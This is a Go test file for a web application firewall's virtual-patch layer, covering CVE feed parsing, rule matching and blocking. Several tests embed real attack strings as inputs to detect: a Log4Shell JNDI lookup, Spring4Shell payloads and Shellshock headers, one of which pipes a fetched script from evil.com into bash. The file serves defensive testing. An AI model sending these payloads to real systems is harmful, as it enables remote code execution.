package virtualpatch

import (
	"encoding/json"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/guardianwaf/guardianwaf/internal/config"
	"github.com/guardianwaf/guardianwaf/internal/engine"
)

// ---------------------------------------------------------------------------
// Layer lifecycle: Name, Stop, GetUpdateStats, NewLayer with nil config
// ---------------------------------------------------------------------------

func TestNewLayer_NilConfig(t *testing.T) {
	layer := NewLayer(nil)
	if layer.Name() != "virtualpatch" {
		t.Errorf("Expected name 'virtualpatch', got %q", layer.Name())
	}
	if !layer.config.Enabled {
		t.Error("DefaultConfig should have Enabled=false, but layer should work")
	}
}

func TestNewLayer_AutoUpdate(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = true
	cfg.UpdateInterval = 100 * time.Millisecond

	layer := NewLayer(cfg)
	defer layer.Stop()

	// Layer should have started auto-update goroutine
	// Give it a moment to run at least one update (will fail since no real NVD server, which is fine)
	time.Sleep(200 * time.Millisecond)

	stats := layer.GetUpdateStats()
	t.Logf("Update stats: count=%d, lastUpdate=%v, lastError=%q", stats.UpdateCount, stats.LastUpdate, stats.LastError)
	// lastError should be set because there's no real NVD server
	if stats.LastError == "" {
		// It may or may not have attempted an update yet
		t.Log("No error yet (update may not have run)")
	}
}

func TestNewLayer_AutoUpdate_WithHTTPServer(t *testing.T) {
	// Create a fake NVD server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := NVDResponse{
			ResultsPerPage: 1,
			TotalResults:   1,
			Vulnerabilities: []NVDCVEItem{
				{
					CVE: NVDCVE{
						ID:               "CVE-2024-TEST",
						SourceIdentifier: "test",
						Published:        time.Now().Format(time.RFC3339),
						LastModified:     time.Now().Format(time.RFC3339),
						VulnStatus:       "Analyzed",
						Descriptions:     []NVDDescription{{Lang: "en", Value: "SQL injection in web parameter"}},
						Metrics: NVDMetrics{
							CVSSMetricV31: []NVDCVSSMetricV31{
								{
									CVSSData: NVDCVSSData{
										Version:      "3.1",
										BaseScore:    9.8,
										BaseSeverity: "CRITICAL",
									},
								},
							},
						},
					},
				},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = true
	cfg.AutoGenerateRules = true
	cfg.NVDFeedURL = server.URL
	cfg.UpdateInterval = 100 * time.Millisecond

	layer := NewLayer(cfg)
	defer layer.Stop()

	// Wait for at least one update
	time.Sleep(300 * time.Millisecond)

	stats := layer.GetUpdateStats()
	t.Logf("Update stats: count=%d, lastError=%q", stats.UpdateCount, stats.LastError)

	if stats.UpdateCount == 0 {
		t.Error("Expected at least one successful update")
	}

	// Check that CVE was added
	cve := layer.GetPatch("VP-CVE-2024-TEST")
	t.Logf("Auto-generated patch: %+v", cve)
}

func TestLayer_Stop(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = true
	cfg.UpdateInterval = 1 * time.Hour // long interval so we control timing

	layer := NewLayer(cfg)
	// Stop should complete without panic
	layer.Stop()
	// Double stop should be safe
	layer.Stop()
}

func TestLayer_Stop_NoAutoUpdate(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = false

	layer := NewLayer(cfg)
	// Stop on a layer without auto-update should be safe
	layer.Stop()
}

func TestLayer_GetUpdateStats_NoUpdate(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = false

	layer := NewLayer(cfg)
	stats := layer.GetUpdateStats()
	if stats.UpdateCount != 0 {
		t.Errorf("Expected UpdateCount=0, got %d", stats.UpdateCount)
	}
}

// ---------------------------------------------------------------------------
// Process method: tenant override
// ---------------------------------------------------------------------------

func TestLayer_Process_TenantOverride(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL"}
	layer := NewLayer(cfg)

	wafCfg := &config.WAFConfig{
		VirtualPatch: config.VirtualPatchConfig{Enabled: false},
	}

	ctx := &engine.RequestContext{
		Method:          "GET",
		Path:            "/",
		TenantWAFConfig: wafCfg,
		Headers: map[string][]string{
			"User-Agent": {"${jndi:ldap://evil.com/a}"},
		},
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("Expected ActionPass when tenant overrides disabled, got %v", result.Action)
	}
}

// ---------------------------------------------------------------------------
// Process method: various attack patterns
// ---------------------------------------------------------------------------

func TestLayer_Process_Spring4Shell_Query(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL"}
	layer := NewLayer(cfg)

	req := &http.Request{
		URL: &url.URL{
			Path:     "/api",
			RawQuery: "class.module.classLoader.URLs[0]=http://evil.com/shell.jsp",
		},
	}

	ctx := &engine.RequestContext{
		Request: req,
		Method:  "GET",
		Path:    "/api",
		Headers: map[string][]string{},
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Error("Expected Spring4Shell pattern to be detected in query")
	}
}

func TestLayer_Process_Spring4Shell_Body(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL"}
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method: "POST",
		Path:   "/api",
		Body:   []byte("class.module.classLoader.URLs[0]=http://evil.com/shell.jsp"),
		Headers: map[string][]string{
			"Content-Type": {"application/x-www-form-urlencoded"},
		},
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Error("Expected Spring4Shell pattern to be detected in body")
	}
	if result.Action != engine.ActionBlock {
		t.Errorf("Expected ActionBlock for Spring4Shell, got %v", result.Action)
	}
}

func TestLayer_Process_Shellshock_Cookie(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL"}
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/cgi-bin/test",
		Headers: map[string][]string{
			"Cookie": {"() { :; }; /bin/bash -c 'echo pwned'"},
		},
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Error("Expected Shellshock pattern to be detected in Cookie header")
	}
}

func TestLayer_Process_Shellshock_Referer(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL"}
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/",
		Headers: map[string][]string{
			"Referer": {"() { :; }; curl http://evil.com/shell.sh | bash"},
		},
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Error("Expected Shellshock pattern in Referer header")
	}
}

func TestLayer_Process_LogAction(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL"} // Only block CRITICAL
	layer := NewLayer(cfg)

	// WordPress REST API is HIGH severity, should log but not block
	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/wp-json/wp/v1/users",
		Headers: map[string][]string{},
	}

	result := layer.Process(ctx)
	// WP REST patch has severity HIGH, action "log", and only CRITICAL is in block list
	// shouldBlock returns false for HIGH, so patch is skipped => ActionPass
	// Let's adjust: add HIGH to block severity
	t.Logf("Result: action=%v score=%d findings=%v", result.Action, result.Score, result.Findings)
}

func TestLayer_Process_HighSeverity_Blocked(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL", "HIGH"}
	layer := NewLayer(cfg)

	// WordPress REST API vulnerability is HIGH
	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/wp-json/wp/v1/users",
		Headers: map[string][]string{},
	}

	result := layer.Process(ctx)
	t.Logf("WP REST: action=%v, score=%d, findings=%v", result.Action, result.Score, result.Findings)
}

func TestLayer_Process_ScoreAccumulation_Log(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL", "HIGH"}
	layer := NewLayer(cfg)

	// Add a custom patch with action "log" and HIGH severity
	custom := &VirtualPatch{
		ID:       "VP-CUSTOM-LOG",
		Name:     "Log-only test patch",
		Severity: "HIGH",
		Action:   "log",
		Score:    30,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/test-log-endpoint", MatchType: "exact"},
		},
		Enabled: true,
	}
	layer.AddPatch(custom)

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/test-log-endpoint",
		Headers: map[string][]string{},
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionLog {
		t.Errorf("Expected ActionLog for log-action patch, got %v", result.Action)
	}
	if result.Score != 30 {
		t.Errorf("Expected score 30, got %d", result.Score)
	}
	if len(result.Findings) == 0 {
		t.Error("Expected findings")
	}
}

func TestLayer_Process_ScoreAccumulation_Block(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.BlockSeverity = []string{"CRITICAL", "HIGH"}
	layer := NewLayer(cfg)

	// Add two log-action patches whose combined score >= 50
	patch1 := &VirtualPatch{
		ID:       "VP-SCORE-1",
		Name:     "Score test 1",
		Severity: "HIGH",
		Action:   "log",
		Score:    30,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/combo", MatchType: "contains"},
		},
		Enabled: true,
	}
	patch2 := &VirtualPatch{
		ID:       "VP-SCORE-2",
		Name:     "Score test 2",
		Severity: "HIGH",
		Action:   "log",
		Score:    30,
		Patterns: []PatchPattern{
			{Type: "method", Pattern: "GET", MatchType: "exact"},
		},
		Enabled: true,
	}
	layer.AddPatch(patch1)
	layer.AddPatch(patch2)

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/combo",
		Headers: map[string][]string{},
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("Expected ActionBlock when accumulated score >= 50, got %v (score=%d)", result.Action, result.Score)
	}
}

// ---------------------------------------------------------------------------
// Severity filtering
// ---------------------------------------------------------------------------

func TestLayer_ShouldBlock(t *testing.T) {
	tests := []struct {
		blockList []string
		severity  string
		expected  bool
	}{
		{[]string{"CRITICAL"}, "CRITICAL", true},
		{[]string{"CRITICAL"}, "HIGH", false},
		{[]string{"CRITICAL", "HIGH"}, "HIGH", true},
		{[]string{"CRITICAL", "HIGH"}, "MEDIUM", false},
		{[]string{}, "CRITICAL", false},
		{[]string{"critical"}, "CRITICAL", true}, // case insensitive
		{[]string{"CRITICAL"}, "critical", true},  // case insensitive
	}

	for _, tt := range tests {
		layer := NewLayer(&Config{
			Enabled:       true,
			BlockSeverity: tt.blockList,
		})
		result := layer.shouldBlock(tt.severity)
		if result != tt.expected {
			t.Errorf("shouldBlock(%v, %q) = %v, want %v", tt.blockList, tt.severity, result, tt.expected)
		}
	}
}

// ---------------------------------------------------------------------------
// Pattern matching: matchPatch, matchPattern, getValueByType
// ---------------------------------------------------------------------------

func TestLayer_MatchPattern_Exact(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchPattern(
		&engine.RequestContext{Path: "/admin"},
		PatchPattern{Type: "path", Pattern: "/admin", MatchType: "exact"},
	)
	if !matched {
		t.Error("Expected exact match on path")
	}
}

func TestLayer_MatchPattern_Contains(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchPattern(
		&engine.RequestContext{Path: "/api/admin/dashboard"},
		PatchPattern{Type: "path", Pattern: "/admin", MatchType: "contains"},
	)
	if !matched {
		t.Error("Expected contains match on path")
	}
}

func TestLayer_MatchPattern_StartsWith(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchPattern(
		&engine.RequestContext{Path: "/api/v1/users"},
		PatchPattern{Type: "path", Pattern: "/api/v1", MatchType: "starts_with"},
	)
	if !matched {
		t.Error("Expected starts_with match on path")
	}
}

func TestLayer_MatchPattern_EndsWith(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchPattern(
		&engine.RequestContext{Path: "/download/shell.php"},
		PatchPattern{Type: "path", Pattern: ".php", MatchType: "ends_with"},
	)
	if !matched {
		t.Error("Expected ends_with match on path")
	}
}

func TestLayer_MatchPattern_Regex(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchPattern(
		&engine.RequestContext{Path: "/wp-json/wp/v1/users"},
		PatchPattern{Type: "path", Pattern: `^/wp-json/wp/v[0-9]+/users`, MatchType: "regex"},
	)
	if !matched {
		t.Error("Expected regex match on path")
	}
}

func TestLayer_MatchPattern_DefaultContains(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	// Empty/unknown MatchType defaults to contains
	matched := layer.matchPattern(
		&engine.RequestContext{Path: "/some/path"},
		PatchPattern{Type: "path", Pattern: "/path", MatchType: ""},
	)
	if !matched {
		t.Error("Expected default contains match")
	}
}

func TestLayer_MatchPattern_NoMatch(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchPattern(
		&engine.RequestContext{Path: "/safe/path"},
		PatchPattern{Type: "path", Pattern: "/admin", MatchType: "exact"},
	)
	if matched {
		t.Error("Expected no match")
	}
}

func TestLayer_GetValueByType_Query(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	req := &http.Request{URL: &url.URL{RawQuery: "foo=bar&baz=qux"}}
	val := layer.getValueByType(&engine.RequestContext{Request: req}, "query", "")
	if val != "foo=bar&baz=qux" {
		t.Errorf("Expected raw query, got %q", val)
	}
}

func TestLayer_GetValueByType_Header(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	val := layer.getValueByType(
		&engine.RequestContext{
			Headers: map[string][]string{"X-Custom": {"test-value"}},
		},
		"header", "X-Custom",
	)
	if val != "test-value" {
		t.Errorf("Expected 'test-value', got %q", val)
	}
}

func TestLayer_GetValueByType_Body(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	// BodyString takes priority
	val := layer.getValueByType(&engine.RequestContext{
		BodyString: "hello",
		Body:       []byte("world"),
	}, "body", "")
	if val != "hello" {
		t.Errorf("Expected BodyString 'hello', got %q", val)
	}

	// Fall back to Body bytes
	val = layer.getValueByType(&engine.RequestContext{
		Body: []byte("world"),
	}, "body", "")
	if val != "world" {
		t.Errorf("Expected Body 'world', got %q", val)
	}
}

func TestLayer_GetValueByType_Method(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	val := layer.getValueByType(&engine.RequestContext{Method: "POST"}, "method", "")
	if val != "POST" {
		t.Errorf("Expected POST, got %q", val)
	}
}

func TestLayer_GetValueByType_UserAgent(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	val := layer.getValueByType(
		&engine.RequestContext{
			Headers: map[string][]string{"User-Agent": {"Mozilla/5.0"}},
		},
		"user_agent", "",
	)
	if val != "Mozilla/5.0" {
		t.Errorf("Expected 'Mozilla/5.0', got %q", val)
	}
}

func TestLayer_GetValueByType_ContentType(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	val := layer.getValueByType(
		&engine.RequestContext{
			Headers: map[string][]string{"Content-Type": {"application/json"}},
		},
		"content_type", "",
	)
	if val != "application/json" {
		t.Errorf("Expected 'application/json', got %q", val)
	}
}

func TestLayer_GetValueByType_URI(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	req := &http.Request{URL: &url.URL{Path: "/api", RawQuery: "q=1"}}
	val := layer.getValueByType(&engine.RequestContext{Request: req}, "uri", "")
	if val != "/api?q=1" {
		t.Errorf("Expected '/api?q=1', got %q", val)
	}
}

func TestLayer_GetValueByType_URI_Fallback(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	// No Request.URL set
	val := layer.getValueByType(&engine.RequestContext{Path: "/fallback"}, "uri", "")
	if val != "/fallback" {
		t.Errorf("Expected '/fallback', got %q", val)
	}
}

func TestLayer_GetValueByType_ClientIP(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	val := layer.getValueByType(
		&engine.RequestContext{ClientIP: net.ParseIP("10.0.0.1")},
		"client_ip", "",
	)
	if val != "10.0.0.1" {
		t.Errorf("Expected '10.0.0.1', got %q", val)
	}
}

func TestLayer_GetValueByType_UnknownType(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	val := layer.getValueByType(&engine.RequestContext{}, "unknown_type", "")
	if val != "" {
		t.Errorf("Expected empty string for unknown type, got %q", val)
	}
}

// ---------------------------------------------------------------------------
// matchPatch: AND logic, OR logic
// ---------------------------------------------------------------------------

func TestLayer_MatchPatch_AND_Logic(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	patch := &VirtualPatch{
		MatchLogic: "and",
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/admin", MatchType: "contains"},
			{Type: "method", Pattern: "POST", MatchType: "exact"},
		},
		Enabled: true,
	}

	// Both match
	matched, details := layer.matchPatch(&engine.RequestContext{
		Path:   "/admin/users",
		Method: "POST",
	}, patch)
	if !matched {
		t.Error("Expected match with AND logic when both patterns match")
	}
	t.Logf("AND match details: %s", details)

	// Only one matches
	matched, _ = layer.matchPatch(&engine.RequestContext{
		Path:   "/admin/users",
		Method: "GET",
	}, patch)
	if matched {
		t.Error("Expected no match with AND logic when only one pattern matches")
	}
}

func TestLayer_MatchPatch_OR_Logic(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	patch := &VirtualPatch{
		MatchLogic: "or",
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/admin", MatchType: "contains"},
			{Type: "method", Pattern: "DELETE", MatchType: "exact"},
		},
		Enabled: true,
	}

	// First pattern matches
	matched, _ := layer.matchPatch(&engine.RequestContext{
		Path:   "/admin/users",
		Method: "GET",
	}, patch)
	if !matched {
		t.Error("Expected match with OR logic when first pattern matches")
	}

	// Second pattern matches
	matched, _ = layer.matchPatch(&engine.RequestContext{
		Path:   "/safe",
		Method: "DELETE",
	}, patch)
	if !matched {
		t.Error("Expected match with OR logic when second pattern matches")
	}

	// Neither matches
	matched, _ = layer.matchPatch(&engine.RequestContext{
		Path:   "/safe",
		Method: "GET",
	}, patch)
	if matched {
		t.Error("Expected no match with OR logic when no pattern matches")
	}
}

func TestLayer_MatchPatch_EmptyPatterns(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	patch := &VirtualPatch{Patterns: nil}
	matched, _ := layer.matchPatch(&engine.RequestContext{}, patch)
	if matched {
		t.Error("Expected no match with empty patterns")
	}
}

func TestLayer_MatchPatch_DefaultAND(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	// Empty MatchLogic defaults to AND
	patch := &VirtualPatch{
		MatchLogic: "",
		Patterns: []PatchPattern{
			{Type: "method", Pattern: "GET", MatchType: "exact"},
		},
		Enabled: true,
	}

	matched, _ := layer.matchPatch(&engine.RequestContext{Method: "GET"}, patch)
	if !matched {
		t.Error("Expected match with default AND logic and single pattern")
	}
}

// ---------------------------------------------------------------------------
// Regex matching
// ---------------------------------------------------------------------------

func TestLayer_MatchRegex_Cache(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	// Match once
	matched := layer.matchRegex("test123", `\d+`)
	if !matched {
		t.Error("Expected regex match for digits")
	}

	// Match again (should use cache)
	matched = layer.matchRegex("abc456", `\d+`)
	if !matched {
		t.Error("Expected regex match from cache")
	}
}

func TestLayer_MatchRegex_InvalidPattern(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchRegex("test", "[invalid")
	if matched {
		t.Error("Expected no match for invalid regex pattern")
	}
}

func TestLayer_MatchRegex_NoMatch(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	matched := layer.matchRegex("hello", `^\d+$`)
	if matched {
		t.Error("Expected no match")
	}
}

func TestLayer_MatchRegex_CacheEviction(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	// Fill the cache beyond 10000 entries (impractical in real use, but test the eviction)
	// Just verify the eviction logic doesn't panic
	for i := 0; i < 5; i++ {
		pattern := strings.Repeat("a", i+1)
		layer.matchRegex("test", pattern)
	}
}

// ---------------------------------------------------------------------------
// Patch management
// ---------------------------------------------------------------------------

func TestLayer_DisablePatch_NotFound(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	if layer.DisablePatch("NONEXISTENT") {
		t.Error("Expected false for disabling non-existent patch")
	}
}

func TestLayer_EnablePatch_NotFound(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	if layer.EnablePatch("NONEXISTENT") {
		t.Error("Expected false for enabling non-existent patch")
	}
}

func TestLayer_GetAllPatches(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	all := layer.GetAllPatches()
	if len(all) == 0 {
		t.Error("Expected some patches from defaults")
	}
	// Verify we have the default patches
	ids := make(map[string]bool)
	for _, p := range all {
		ids[p.ID] = true
	}
	if !ids["VP-LOG4SHELL-001"] {
		t.Error("Expected VP-LOG4SHELL-001 in all patches")
	}
	if !ids["VP-SPRING4SHELL-001"] {
		t.Error("Expected VP-SPRING4SHELL-001 in all patches")
	}
	if !ids["VP-SHELLSHOCK-001"] {
		t.Error("Expected VP-SHELLSHOCK-001 in all patches")
	}
}

func TestLayer_DisableAndReEnable(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true, BlockSeverity: []string{"CRITICAL"}})

	// Disable
	if !layer.DisablePatch("VP-LOG4SHELL-001") {
		t.Error("Expected DisablePatch to succeed")
	}

	// Verify disabled
	patch := layer.GetPatch("VP-LOG4SHELL-001")
	if patch.Enabled {
		t.Error("Expected patch to be disabled")
	}

	// Verify it's no longer in active patches
	for _, p := range layer.GetActivePatches() {
		if p.ID == "VP-LOG4SHELL-001" {
			t.Error("Disabled patch should not be in active patches")
		}
	}

	// Re-enable
	if !layer.EnablePatch("VP-LOG4SHELL-001") {
		t.Error("Expected EnablePatch to succeed")
	}

	patch = layer.GetPatch("VP-LOG4SHELL-001")
	if !patch.Enabled {
		t.Error("Expected patch to be re-enabled")
	}
}

func TestLayer_TriggerUpdate_NoNVDClient(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = false
	layer := NewLayer(cfg)

	err := layer.TriggerUpdate()
	if err == nil {
		t.Error("Expected error when NVD client not configured")
	}
	if !strings.Contains(err.Error(), "NVD client not configured") {
		t.Errorf("Expected 'NVD client not configured' error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Database operations
// ---------------------------------------------------------------------------

func TestDatabase_AddCVE_WithProducts(t *testing.T) {
	db := NewDatabase()

	cve := &CVEEntry{
		CVEID:    "CVE-2024-PROD",
		Severity: "HIGH",
		AffectedProducts: []Product{
			{CPE: "cpe:2.3:a:apache:log4j:2.14.0:*:*:*:*:*:*:*", Vulnerable: true},
		},
		Patches: []VirtualPatch{
			{ID: "VP-PROD-001", Enabled: true, Severity: "HIGH"},
		},
	}
	db.AddCVE(cve)

	// Retrieve CVE
	retrieved := db.GetCVE("CVE-2024-PROD")
	if retrieved == nil {
		t.Fatal("Expected to retrieve CVE")
	}
	if retrieved.CVEID != "CVE-2024-PROD" {
		t.Errorf("Expected CVE-2024-PROD, got %q", retrieved.CVEID)
	}

	// Retrieve by product
	patches := db.GetPatchesForProduct("cpe:2.3:a:apache:log4j:2.14.0:*:*:*:*:*:*:*")
	if len(patches) == 0 {
		t.Error("Expected patches for product")
	}
}

func TestDatabase_Stats(t *testing.T) {
	db := NewDatabase()
	db.AddCVE(&CVEEntry{CVEID: "CVE-1", Severity: "CRITICAL", Patches: []VirtualPatch{{ID: "VP-1", Enabled: true}}})
	db.AddCVE(&CVEEntry{CVEID: "CVE-2", Severity: "HIGH", Patches: []VirtualPatch{{ID: "VP-2", Enabled: false}}})

	stats := db.Stats()
	if stats.TotalCVEs != 2 {
		t.Errorf("Expected TotalCVEs=2, got %d", stats.TotalCVEs)
	}
	if stats.TotalPatches != 2 {
		t.Errorf("Expected TotalPatches=2, got %d", stats.TotalPatches)
	}
	if stats.ActivePatches != 1 {
		t.Errorf("Expected ActivePatches=1, got %d", stats.ActivePatches)
	}
	if stats.BySeverity["CRITICAL"] != 1 {
		t.Errorf("Expected CRITICAL count=1, got %d", stats.BySeverity["CRITICAL"])
	}
}

// ---------------------------------------------------------------------------
// NVD Client
// ---------------------------------------------------------------------------

func TestNVDClient_SetBaseURL(t *testing.T) {
	client := NewNVDClient("test-key")
	err := client.SetBaseURL("https://example.com/api/cves")
	if err != nil {
		t.Errorf("Expected no error for public URL, got: %v", err)
	}
}

func TestNVDClient_SetBaseURL_PrivateIP(t *testing.T) {
	client := NewNVDClient("")
	tests := []string{
		"http://localhost/api",
		"http://127.0.0.1/api",
		"http://10.0.0.1/api",
		"http://192.168.1.1/api",
		"http://172.16.0.1/api",
		"http://169.254.0.1/api",
		"http://0.0.0.0/api",
		"http://test.internal/api",
		"http://test.local/api",
	}

	for _, u := range tests {
		err := client.SetBaseURL(u)
		if err == nil {
			t.Errorf("Expected error for private URL %q", u)
		}
	}
}

func TestNVDClient_SetBaseURL_InvalidURL(t *testing.T) {
	client := NewNVDClient("")
	err := client.SetBaseURL("://invalid")
	if err == nil {
		t.Error("Expected error for invalid URL")
	}
}

func TestNVDClient_Search(t *testing.T) {
	// Create test server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("apiKey") != "test-key" {
			t.Error("Expected apiKey header")
		}
		if r.URL.Query().Get("keywordSearch") != "log4j" {
			t.Errorf("Expected keywordSearch=log4j, got %q", r.URL.Query().Get("keywordSearch"))
		}

		resp := NVDResponse{
			TotalResults: 1,
			Vulnerabilities: []NVDCVEItem{
				{
					CVE: NVDCVE{
						ID:       "CVE-2021-44228",
						Descriptions: []NVDDescription{{Lang: "en", Value: "Log4j RCE"}},
						Metrics: NVDMetrics{
							CVSSMetricV31: []NVDCVSSMetricV31{
								{CVSSData: NVDCVSSData{BaseScore: 10.0, BaseSeverity: "CRITICAL"}},
							},
						},
					},
				},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer server.Close()

	client := NewNVDClient("test-key")
	client.SetBaseURL(server.URL)

	resp, err := client.Search(SearchOptions{
		Keyword:        "log4j",
		ResultsPerPage: 10,
	})
	if err != nil {
		t.Fatalf("Search failed: %v", err)
	}
	if resp.TotalResults != 1 {
		t.Errorf("Expected TotalResults=1, got %d", resp.TotalResults)
	}
	if len(resp.Vulnerabilities) != 1 {
		t.Errorf("Expected 1 vulnerability, got %d", len(resp.Vulnerabilities))
	}
	if resp.Vulnerabilities[0].CVE.ID != "CVE-2021-44228" {
		t.Errorf("Expected CVE-2021-44228, got %q", resp.Vulnerabilities[0].CVE.ID)
	}
}

func TestNVDClient_Search_ErrorStatus(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer server.Close()

	client := NewNVDClient("")
	client.SetBaseURL(server.URL)

	_, err := client.Search(SearchOptions{})
	if err == nil {
		t.Error("Expected error for 500 status")
	}
}

func TestNVDClient_GetCVE(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("cveId") != "CVE-2021-44228" {
			t.Errorf("Expected cveId=CVE-2021-44228, got %q", r.URL.Query().Get("cveId"))
		}

		resp := NVDResponse{
			Vulnerabilities: []NVDCVEItem{
				{
					CVE: NVDCVE{
						ID:           "CVE-2021-44228",
						Published:    "2021-12-10T00:00:00Z",
						LastModified: "2022-01-01T00:00:00Z",
						VulnStatus:   "Analyzed",
						Descriptions: []NVDDescription{{Lang: "en", Value: "Log4j RCE"}},
						Metrics: NVDMetrics{
							CVSSMetricV31: []NVDCVSSMetricV31{
								{CVSSData: NVDCVSSData{BaseScore: 10.0, BaseSeverity: "CRITICAL"}},
							},
						},
						Weaknesses: []NVDWeakness{
							{
								Description: []NVDDescription{{Lang: "en", Value: "CWE-502"}},
							},
						},
						Configurations: []NVDConfig{
							{
								Nodes: []NVDNode{
									{
										CPEMatch: []CPEMatch{
											{Vulnerable: true, Criteria: "cpe:2.3:a:apache:log4j:*"},
										},
									},
								},
							},
						},
					},
				},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer server.Close()

	client := NewNVDClient("")
	client.SetBaseURL(server.URL)

	entry, err := client.GetCVE("CVE-2021-44228")
	if err != nil {
		t.Fatalf("GetCVE failed: %v", err)
	}
	if entry.CVEID != "CVE-2021-44228" {
		t.Errorf("Expected CVE-2021-44228, got %q", entry.CVEID)
	}
	if entry.CVSSScore != 10.0 {
		t.Errorf("Expected CVSS 10.0, got %f", entry.CVSSScore)
	}
	if entry.Severity != "CRITICAL" {
		t.Errorf("Expected CRITICAL, got %q", entry.Severity)
	}
	if entry.Description != "Log4j RCE" {
		t.Errorf("Expected 'Log4j RCE', got %q", entry.Description)
	}
	if entry.Source != "nvd" {
		t.Errorf("Expected source 'nvd', got %q", entry.Source)
	}
	if !entry.Active {
		t.Error("Expected Active=true")
	}
	if len(entry.CWEs) == 0 || entry.CWEs[0] != "CWE-502" {
		t.Errorf("Expected CWEs=[CWE-502], got %v", entry.CWEs)
	}
	if len(entry.AffectedProducts) == 0 {
		t.Error("Expected affected products")
	}
}

func TestNVDClient_GetCVE_NotFound(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := NVDResponse{Vulnerabilities: []NVDCVEItem{}}
		json.NewEncoder(w).Encode(resp)
	}))
	defer server.Close()

	client := NewNVDClient("")
	client.SetBaseURL(server.URL)

	_, err := client.GetCVE("CVE-NONEXISTENT")
	if err == nil {
		t.Error("Expected error for CVE not found")
	}
}

